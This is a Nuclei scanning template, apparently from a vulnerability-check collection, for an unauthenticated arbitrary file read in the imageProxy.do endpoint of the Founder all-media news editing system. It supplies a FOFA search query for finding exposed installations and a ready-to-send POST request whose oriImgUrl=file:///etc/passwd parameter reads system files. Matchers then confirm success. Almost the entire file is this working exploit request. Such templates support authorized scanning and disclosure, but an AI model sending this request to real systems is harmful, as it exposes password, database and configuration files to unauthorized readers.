id: fangzheng-imageProxy_do-File-reading

info:
  name: 方正畅享全媒体新闻采编系统 imageProxy.do 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="FOUNDER-全媒体采编系统"
    方正畅享全媒体新闻采编系统 imageProxy.do 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://mp.weixin.qq.com/s/Z5bhGaKeVS6dyPsCiqJXqg?token=1451506197&lang=zh_CN
  tags: File reading


http:
  - raw:
      - |
        POST /newsedit/outerfotobase/imageProxy.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept: text/plain, */*; q=0.01
        
        oriImgUrl=file:///etc/passwd
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
          - '/bin/bash'
        condition: and
      - type: status
        status: 
          - 200